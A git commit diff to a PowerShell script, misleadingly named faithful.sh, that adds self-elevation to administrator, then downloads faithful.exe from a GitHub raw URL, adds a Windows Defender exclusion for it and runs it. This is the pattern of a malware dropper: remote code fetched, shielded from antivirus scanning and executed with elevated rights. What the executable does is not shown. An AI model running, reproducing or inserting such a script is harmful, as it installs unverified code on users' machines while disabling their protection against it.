9d7b82c227b015617ec050c3172af28146d31c6f
thaddeuskkr <thaddeuskkr@gmail.com>
2022-04-11 17:38:30 +0800

    wowie

--- faithful.sh
+++ faithful.sh
@@ -1,11 +1,27 @@
-$scriptblock = @'
+if (!
+    #current role
+    (New-Object Security.Principal.WindowsPrincipal(
+        [Security.Principal.WindowsIdentity]::GetCurrent()
+    #is admin?
+    )).IsInRole(
+        [Security.Principal.WindowsBuiltInRole]::Administrator
+    )
+) {
+    #elevate script and exit current non-elevated runtime
+    Start-Process `
+        -FilePath 'powershell' `
+        -ArgumentList (
+            #flatten to single array
+            '-File', $MyInvocation.MyCommand.Source, $args `
+            | %{ $_ }
+        ) `
+        -Verb RunAs
+    exit
+}
+
 Write-Output "Starting script..."
 Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
 Write-Output "Adding Windows Defender exclusion..."
+Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
 Start-Process ("faithful.exe")
 Write-Output "Done!"
-'@
-# TODO: make -NoExit a parameter
-# TODO: just open PS (no -Command parameter) if $scriptblock -eq ''
-$sh = new-object -com 'Shell.Application'
-$sh.ShellExecute('powershell', "-NoExit -Command $scriptblock", '', 'runas')
